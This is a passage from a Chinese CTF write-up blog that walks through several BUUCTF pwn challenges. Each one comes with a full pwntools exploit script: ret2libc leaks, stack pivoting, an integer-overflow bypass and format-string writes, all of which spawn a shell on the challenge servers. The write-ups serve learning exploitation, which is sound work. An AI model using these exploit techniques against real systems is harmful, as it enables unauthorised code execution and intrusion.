<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\x00’，可起到截断字符串长度的效果。</p>
<p>第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 &#x3D; 255个字节，所以让buf[7] &#x3D; ‘\xff’即可。代码中的buf[v5-1] &#x3D; 0改变的是字符串末尾’\x00’的值，不影响buf[7] 。</p>
<p>所以第一次读取的payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher</p>
<p>main函数地址用elf.sym[‘main’]是找不到的，objdump -t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">libc_base = write_addr -  libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX，有system函数，但是需要传入binsh。</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081134102.png" alt="image-20230808113405078"></p>
<p>然而，栈上变量 <strong>s</strong> 位于 <strong>ebp</strong>-0x28，而 <strong>read</strong> 函数仅能读入0x30个字节，那么若想实施缓冲区溢出，只有0x08 &#x3D; 0x30-0x28个字节供我们进行布局。因此，在只有 <strong>ebp</strong> 与 <strong>ret</strong> 能被篡改的条件下可尝试使用栈迁移。</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081105982.png" alt="image-20230808110517945"></p>
<p>程序存在leave ret指令，并且存在system函数可执行</p>
<p>而binsh则需要在栈上传入</p>
<p>So，我们最终要将 <strong>esp</strong>（与 <strong>ebp</strong>）劫持到当前栈的另一区域上，以完成传统栈溢出payload的实施</p>
<p>在本题中，劫持目标地址即为缓冲区变量 <strong>s</strong> 的起始地址</p>
<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><h3 id="第一步，泄露出ebp，通过ebp-偏移量的方法计算栈上地址"><a href="#第一步，泄露出ebp，通过ebp-偏移量的方法计算栈上地址" class="headerlink" title="第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址"></a>第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址</h3><p>printf函数在未遇到”\x00”时会一直输出，可以用来泄露出ebp的值</p>
<p>因为栈上地址间的相对位置是确定的，所以我们可以通过第二次输入的位置和泄露的ebp地址的偏移来定位我们的目标地址</p>
<p>在第二次输入read函数返回处下断点调试，计算可得泄露ebp与缓冲区起始位置相距0x38</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081121310.png" alt="image-20230808112121242"></p>
<h3 id="第二步-栈迁移"><a href="#第二步-栈迁移" class="headerlink" title="第二步 栈迁移"></a>第二步 栈迁移</h3><p>精心构造栈上的布局来实现栈迁移</p>
<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p><del>此处盗图，已标明</del></p>
<p>画栈图有助于理解整个流程</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081132448.png" alt="image-20230808113204424"></p>
<p>整个长条表示read读入的字节长度0x30，old_ebp表示泄露的ebp，减去0x38指向的就是变量s的起始位置，返回地址被覆盖为leav_ret的地址。</p>
<p>第一次自带的leave指令执行后，ebp的值为old_ebp - 0x38 ，esp指向篡改的返回地址leave_ret；接着执行ret指令pop eip再一次执行leave ret</p>
<p>第二次leave指令执行后，esp指向ebp+4也就是图中’aaaa’的下一位，ebp的值仍为old_ebp - 0x38 ；此时已经完成栈迁移。接下来ret指令将ebp+4弹入eip执行，所以在aaaa之后的地址需要放置我们的system函数和binsh</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081146177.png" alt="image-20230808114650151"></p>
<p>binsh和其地址都可以在迁移过后的栈上布局</p>
<h2 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28160</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x27</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">p.send(payload1) <span class="comment"># not sendline</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">original_ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(original_ebp))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment"># for location, start of hijaction</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += <span class="string">b&#x27;dddd&#x27;</span> <span class="comment"># fake stack ebp</span></span><br><span class="line">payload2 += p32(original_ebp - <span class="number">0x28</span>) <span class="comment"># addr of binsh</span></span><br><span class="line">payload2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> <span class="comment"># at ebp-0x28</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 += p32(original_ebp - <span class="number">0x38</span>) <span class="comment"># hijack ebp ,-0x38 is the aaaa</span></span><br><span class="line">payload2 += p32(leave_ret) <span class="comment"># new leave ret</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/max1z/p/15299000.html">参考博客</a></p>
<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>经典ret2libc3</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28146</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;write&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(got_addr)+p32(<span class="number">0xD</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#0xf7db1190</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr = &quot;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX泄露libc</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p>
<p>注意get_n是自定义函数</p>
<p>规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。</p>
<p>ROP链泄露libc，溢出覆盖返回地址getshell</p>
<h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn0&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn0&#x27;</span>) </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;printf&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">fmt = <span class="number">0x080486F</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)</span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span></span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar_addr= u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;getchar_addr = &quot;</span>,<span class="built_in">hex</span>(getchar_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)</span></span><br><span class="line"><span class="string">offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)</span></span><br><span class="line"><span class="string">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">base_addr = getchar_addr - libc.symbols[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base_addr</span><br><span class="line">binsh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__() + base_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"><span class="comment">#print(&quot;libc_base_addr = &quot;,hex(offset))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p>注意这题位64位。32位和64位传参有区别</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p>
<p>思路：</p>
<ol>
<li>利用puts函数泄露出puts函数真实地址</li>
<li>通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址</li>
<li>构造rop链栈溢出getshell</li>
</ol>
<p>puts函数通过pop rdi ; ret 传参</p>
<p>用ROPgadget可以找到</p>
<h2 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29917</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#elf</span></span><br><span class="line">	main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">	plt_addr  = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	got_addr  = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	pop_rdi   = <span class="number">0x0400733</span></span><br><span class="line">	ret_addr  = <span class="number">0x04004c9</span></span><br><span class="line">	</span><br><span class="line">	payload   = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#libc</span></span><br><span class="line">	lib 	        = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr) </span><br><span class="line">	lib_puts_addr   = lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#base</span></span><br><span class="line">	base_addr       = puts_addr - lib_puts_addr</span><br><span class="line">	system_addr	= base_addr + lib_system_addr</span><br><span class="line">	bin_addr	= base_addr + lib_bin_addr</span><br><span class="line">	payload		= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位的ret2libc3</p>
<h2 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h2><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p>
<p>利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。</p>
<h2 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25502</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#一定要用题目给的libc文件，可能必须要用题目给的才能打通</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">fmt = <span class="number">0x0000000000400790</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr ======&gt;&gt; &quot;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr -  libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>BUUCTF pwn<br>考点：格式化字符串漏洞</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072321504.png" alt="image-20230807232152466"></p>
<p>格式化字符串，任意地址写漏洞</p>
<p>将x写为4即可getshell，x的地址为0x0804a02c，调试可得输入的内容位于栈偏移11个单位处</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29551</span>)</span><br><span class="line">x_addr=<span class="number">0x804A02C</span></span><br><span class="line"></span><br><span class="line">payload=p32(x_addr)+<span class="string">b&quot;%11$n&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>或更通用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#-*- coding=UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./jarvisoj_fm&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26325</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line"><span class="comment">#将栈偏移13个单位处的x_addr指针指向的地址内容修改为4</span></span><br><span class="line"><span class="comment">#payload中x_addr写入的位置为栈偏移13处，见下图</span></span><br><span class="line"><span class="comment">#25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13</span></span><br><span class="line">payload = <span class="string">&#x27;%4c%13$n&#x27;</span> + p32(x_addr)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><h2 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h2><p>64位开启NX</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081846151.png" alt="image-20230808184656119"></p>
<p>注意程序直接使用sys_read和sys_write函数而不是通常的read和write，在构造payload时要注意在函数返回时没有pop rbp这一步而是直接执行ret，所以我们直接覆盖rbp为vuln函数地址。</p>
<h2 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h2><p>本题两种做法，一种是ret2csu，利用__libc_csu_init布置栈空间；一种是SROP</p>
<p>题目也给出了相应的gadgets，若选择rax传参0xF（系统调用号），则可执行sigreturn系统调用；若选择rax传参0x3B，则可执行excve(‘&#x2F;bin&#x2F;sh’,0,0)系统调用</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081841853.png" alt="image-20230808184158810"></p>
<p>我们需要在栈上布置ROPgadgets和各参数，而栈地址是随机的，所以我们首先要泄露栈地址。</p>
<p>同时我们知道栈上的各地址间的相对位置是不变的，所以泄露出栈地址后可以通过与buf的偏移计算出buf的地址</p>
<p>经过调试发现，如图： buf的起始地址为0x7fffffffded0，目标泄露栈地址（即某个rbp的值）为图中栈偏移为02的地址0x7fffffffe018，二者相差0x148。这是本地的偏移，若要获得与远程环境相同的偏移要应用patchelf。具体可看这篇文章。用相同的方法调试可得远程偏移为0x118.</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857706.png" alt="image-20230808185715664"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857588.png" alt="image-20230808185747565"></p>
<p>在接收泄露的栈地址之前需要去掉多余的buf(0x10)+rbp(vul_addr)+栈上偏移为01的地址。</p>
<p>exp第一部分</p>
